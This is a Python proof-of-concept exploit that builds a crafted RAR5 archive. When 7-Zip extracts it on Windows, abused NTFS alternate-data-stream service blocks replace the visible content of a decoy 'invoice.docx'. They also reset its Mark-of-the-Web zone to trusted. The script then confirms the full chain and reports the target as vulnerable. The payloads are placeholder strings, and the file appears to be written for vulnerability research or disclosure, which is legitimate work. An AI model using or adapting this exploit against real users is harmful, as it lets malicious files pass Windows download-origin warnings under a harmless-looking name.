from __future__ import annotations

import argparse
import binascii
import hashlib
import os
import shutil
import struct
import subprocess
import sys
from pathlib import Path


MARKER = b"Rar!\x1a\x07\x01\x00"

HFL_EXTRA = 1 << 0
HFL_DATA = 1 << 1

HT_ARC = 1
HT_FILE = 2
HT_SERVICE = 3
HT_END = 5

EXTRA_SUBDATA = 7
HOST_WINDOWS = 0
ATTR_ARCHIVE = 0x20

MAIN_NAME = "invoice.docx"
MAIN_BYTES = b"BENIGN preview bytes from main RAR5 file\r\n"
FINAL_BYTES = b"ATTACKER final visible bytes from ::$DATA stream\r\n"
FINAL_ZONE = b"[ZoneTransfer]\r\nZoneId=0\r\n"
SOURCE_ZONE = b"[ZoneTransfer]\r\nZoneId=3\r\n"


def vint(value: int) -> bytes:
    if value < 0:
        raise ValueError("negative vint")
    out = bytearray()
    while True:
        b = value & 0x7F
        value >>= 7
        if value:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def block(header_type: int, header_flags: int, body: bytes, *, extra: bytes = b"", data: bytes = b"") -> bytes:
    fields = bytearray()
    fields += vint(header_type)
    flags = header_flags
    if extra:
        flags |= HFL_EXTRA
    if data:
        flags |= HFL_DATA
    fields += vint(flags)
    if extra:
        fields += vint(len(extra))
    if data:
        fields += vint(len(data))
    fields += body
    fields += extra

    size = vint(len(fields))
    crc_data = size + fields
    crc = binascii.crc32(crc_data) & 0xFFFFFFFF
    return struct.pack("<I", crc) + crc_data + data


def file_body(name: str, data: bytes, *, record_name: str | None = None, method: int = 0) -> bytes:
    name_bytes = (record_name if record_name is not None else name).encode("utf-8")
    body = bytearray()
    body += vint(0)
    body += vint(len(data))
    body += vint(ATTR_ARCHIVE)
    body += vint(method)
    body += vint(HOST_WINDOWS)
    body += vint(len(name_bytes))
    body += name_bytes
    return bytes(body)


def subdata_extra(stream_name: str) -> bytes:
    data = stream_name.encode("utf-8")
    rec = vint(EXTRA_SUBDATA) + data
    return vint(len(rec)) + rec


def service_stream(parent_name: str, stream_name: str, payload: bytes) -> bytes:
    return block(
        HT_SERVICE,
        0,
        file_body(parent_name, payload, record_name="STM"),
        extra=subdata_extra(stream_name),
        data=payload,
    )


def build_archive() -> bytes:
    out = bytearray(MARKER)
    out += block(HT_ARC, 0, vint(0))
    out += block(HT_FILE, 0, file_body(MAIN_NAME, MAIN_BYTES), data=MAIN_BYTES)
    out += service_stream(MAIN_NAME, "::$DATA", FINAL_BYTES)
    out += service_stream(MAIN_NAME, ":Zone.Identifier:$DATA", FINAL_ZONE)
    out += block(HT_END, 0, vint(0))
    return bytes(out)


def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest().upper()


def find_7z(explicit: str | None) -> Path:
    candidates: list[str] = []
    if explicit:
        candidates.append(explicit)
    found = shutil.which("7z")
    if found:
        candidates.append(found)
    candidates.append(r"C:\Program Files\7-Zip\7z.exe")
    candidates.append(r"C:\Program Files (x86)\7-Zip\7z.exe")

    for candidate in candidates:
        path = Path(candidate)
        if path.is_file():
            return path
    raise SystemExit("7z.exe not found. Pass --sevenzip C:\\path\\to\\7z.exe")


def run_7z(sevenzip: Path, *args: str) -> str:
    proc = subprocess.run(
        [str(sevenzip), *args],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        errors="replace",
        check=False,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"7-Zip failed with exit code {proc.returncode}\n{proc.stdout}")
    return proc.stdout


def read_ads(path: Path, stream_name: str) -> bytes:
    with open(str(path) + ":" + stream_name, "rb") as f:
        return f.read()


def write_ads(path: Path, stream_name: str, data: bytes) -> None:
    with open(str(path) + ":" + stream_name, "wb") as f:
        f.write(data)


def printable(data: bytes) -> str:
    return data.decode("utf-8", errors="replace").replace("\r", "\\r").replace("\n", "\\n")


def main() -> int:
    parser = argparse.ArgumentParser(description="Verify the 7-Zip RAR5 STM MotW/ADS full chain.")
    parser.add_argument("--sevenzip", help="Path to 7z.exe. Defaults to PATH or Program Files.")
    parser.add_argument("--work-dir", default="poc-run", help="Directory for generated files.")
    args = parser.parse_args()

    if os.name != "nt":
        raise SystemExit("This PoC uses Windows NTFS alternate data streams.")

    sevenzip = find_7z(args.sevenzip)
    work_dir = Path(args.work_dir).resolve()
    if work_dir.exists():
        shutil.rmtree(work_dir)
    work_dir.mkdir(parents=True)

    archive_path = work_dir / "rar5-content-and-motw-chain.rar"
    archive_path.write_bytes(build_archive())
    write_ads(archive_path, "Zone.Identifier", SOURCE_ZONE)

    version = run_7z(sevenzip).splitlines()[1].strip()
    listing = run_7z(sevenzip, "l", "-slt", "-sns", str(archive_path))
    output_dir = work_dir / "out"
    output_dir.mkdir()
    extraction = run_7z(sevenzip, "x", "-y", "-snz1", f"-o{output_dir}", str(archive_path))

    final_path = output_dir / MAIN_NAME
    final_content = final_path.read_bytes()
    final_zone = read_ads(final_path, "Zone.Identifier")

    if final_content != FINAL_BYTES:
        raise AssertionError(f"Final visible content mismatch: {printable(final_content)}")
    if final_zone != FINAL_ZONE:
        raise AssertionError(f"Final Zone.Identifier mismatch: {printable(final_zone)}")

    listed_rows = [
        line
        for line in listing.splitlines()
        if line in {
            "Path = invoice.docx",
            "Path = invoice.docx::$DATA",
            "Path = invoice.docx:Zone.Identifier:$DATA",
            "Alternate Stream = -",
            "Alternate Stream = +",
        }
        or line.startswith("Size = ")
    ]
    extracted_rows = [
        line
        for line in extraction.splitlines()
        if "Everything is Ok" in line or line.startswith("Files:") or line.startswith("Alternate Streams")
    ]

    print(f"[+] 7-Zip: {version}")
    print(f"[+] archive: {archive_path}")
    print(f"[+] archive sha256: {sha256(archive_path)}")
    print("[+] listing evidence:")
    for row in listed_rows:
        print(f"    {row}")
    print("[+] extraction evidence:")
    for row in extracted_rows:
        print(f"    {row}")
    print(f"[+] final visible content: {printable(final_content)}")
    print(f"[+] final Zone.Identifier: {printable(final_zone)}")
    print("[+] VULNERABLE: full chain verified")
    return 0


if __name__ == "__main__":
    sys.exit(main())
